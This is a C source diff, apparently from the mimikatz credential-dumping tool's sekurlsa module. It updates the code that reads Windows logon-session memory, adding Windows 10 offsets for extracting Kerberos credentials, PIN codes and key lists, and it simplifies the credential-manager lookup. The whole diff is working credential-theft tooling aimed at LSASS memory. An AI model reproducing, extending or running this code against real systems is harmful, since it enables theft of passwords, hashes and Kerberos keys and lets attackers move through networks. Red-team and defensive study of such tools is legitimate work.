@@ -28,7 +28,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_msv(IN ULONG_PTR reserved, IN 
 						{
 							dprintf("\n\t [%08x] %Z", credentials.AuthenticationPackageId, &primaryCredentials.Primary);
 							if(RtlEqualString(&primaryCredentials.Primary, &PRIMARY_STRING, FALSE))
-								flags = KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY;
+								flags = (NtBuildNumber < KULL_M_WIN_BUILD_10b) ? KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY : KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY_10;
 							else if(RtlEqualString(&primaryCredentials.Primary, &CREDENTIALKEYS_STRING, FALSE))
 								flags = KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY;
 							else
@@ -48,34 +48,57 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_msv(IN ULONG_PTR reserved, IN 
 	}
 }
 
+const KERB_INFOS kerbHelper[] = {
+	{
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier),
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, credentials),
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, pinCode),
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, pKeyList),
+		sizeof(KIWI_KERBEROS_LOGON_SESSION),
+	},
+	{
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, LocallyUniqueIdentifier),
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, credentials),
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, pinCode),
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, pKeyList),
+		sizeof(KIWI_KERBEROS_LOGON_SESSION_10),
+	}
+};
+
 void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_kerberos(IN ULONG_PTR pKerbGlobalLogonSessionTable, IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
 {
-	KIWI_KERBEROS_LOGON_SESSION session;
+	PBYTE data;
 	UNICODE_STRING pinCode;
 	KIWI_KERBEROS_KEYS_LIST_6 keyList;
 	PKERB_HASHPASSWORD_6 pHashPassword;
 	DWORD i;
 	ULONG_PTR ptr;
-	if(ptr = kuhl_m_sekurlsa_utils_pFromAVLByLuid(pKerbGlobalLogonSessionTable, FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier), pData->LogonId))
+	ULONG KerbOffsetIndex = (NtBuildNumber < KULL_M_WIN_BUILD_10b) ? 0 : 1;
+
+	if(ptr = kuhl_m_sekurlsa_utils_pFromAVLByLuid(pKerbGlobalLogonSessionTable, kerbHelper[KerbOffsetIndex].offsetLuid, pData->LogonId))
 	{
-		if(ReadMemory(ptr, &session, sizeof(KIWI_KERBEROS_LOGON_SESSION), NULL))
+		if(data = (PBYTE) LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].structSize))
 		{
-			kuhl_m_sekurlsa_genericCredsOutput(&session.credentials, pData->LogonId, 0);
-			if(session.pinCode)
-				if(ReadMemory((ULONG_PTR) session.pinCode, &pinCode, sizeof(UNICODE_STRING), NULL))
-					kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) &pinCode, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE);
-			if(session.pKeyList)
-				if(ReadMemory((ULONG_PTR) session.pKeyList, &keyList, sizeof(KIWI_KERBEROS_KEYS_LIST_6) - sizeof(KERB_HASHPASSWORD_6), NULL))
-					if(pHashPassword = (PKERB_HASHPASSWORD_6) LocalAlloc(LPTR, keyList.cbItem * sizeof(KERB_HASHPASSWORD_6)))
-					{
-						if(ReadMemory((ULONG_PTR) session.pKeyList + sizeof(KIWI_KERBEROS_KEYS_LIST_6) - sizeof(KERB_HASHPASSWORD_6), pHashPassword, keyList.cbItem * sizeof(KERB_HASHPASSWORD_6), NULL))
+			if(ReadMemory(ptr, data, (ULONG) kerbHelper[KerbOffsetIndex].structSize, NULL))
+			{
+				kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) (data + kerbHelper[KerbOffsetIndex].offsetCreds), pData->LogonId, 0);
+				if(*(PUNICODE_STRING *) (data + kerbHelper[KerbOffsetIndex].offsetPin))
+					if(ReadMemory((ULONG_PTR) *(PUNICODE_STRING *) (data + kerbHelper[KerbOffsetIndex].offsetPin), &pinCode, sizeof(UNICODE_STRING), NULL))
+						kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) &pinCode, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE);
+				if(*(PVOID *) (data + kerbHelper[KerbOffsetIndex].offsetKeyList))
+					if(ReadMemory((ULONG_PTR) *(PVOID *) (data + kerbHelper[KerbOffsetIndex].offsetKeyList), &keyList, sizeof(KIWI_KERBEROS_KEYS_LIST_6)/* - sizeof(KERB_HASHPASSWORD_6)*/, NULL))
+						if(pHashPassword = (PKERB_HASHPASSWORD_6) LocalAlloc(LPTR, keyList.cbItem * sizeof(KERB_HASHPASSWORD_6)))
 						{
-							dprintf("\n\t * Key List");
-							for(i = 0; i < keyList.cbItem; i++)
-								kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) (pHashPassword + i), pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST);
+							if(ReadMemory((ULONG_PTR) *(PVOID *) (data + kerbHelper[KerbOffsetIndex].offsetKeyList) + sizeof(KIWI_KERBEROS_KEYS_LIST_6)/* - sizeof(KERB_HASHPASSWORD_6)*/, pHashPassword, keyList.cbItem * sizeof(KERB_HASHPASSWORD_6), NULL))
+							{
+								dprintf("\n\t * Key List");
+								for(i = 0; i < keyList.cbItem; i++)
+									kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) (pHashPassword + i), pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST);
+							}
+							LocalFree(pHashPassword);
 						}
-						LocalFree(pHashPassword);
-					}
+			}
+			LocalFree(data);
 		}
 	}
 	else dprintf("KO");
@@ -210,13 +233,8 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_credman(IN ULONG_PTR reserved,
 	DWORD nbCred = 0;
 	ULONG_PTR pCur, pRef;
 	KIWI_GENERIC_PRIMARY_CREDENTIAL kiwiCreds;
-	ULONG CredOffsetIndex;
 	PBYTE buffer;
-	
-	if(NtBuildNumber < KULL_M_WIN_BUILD_7)
-		CredOffsetIndex = 0;
-	else
-		CredOffsetIndex = 1;
+	ULONG CredOffsetIndex = (NtBuildNumber < KULL_M_WIN_BUILD_7) ? 0 : 1;
 
 	if(pData->pCredentialManager)
 	{
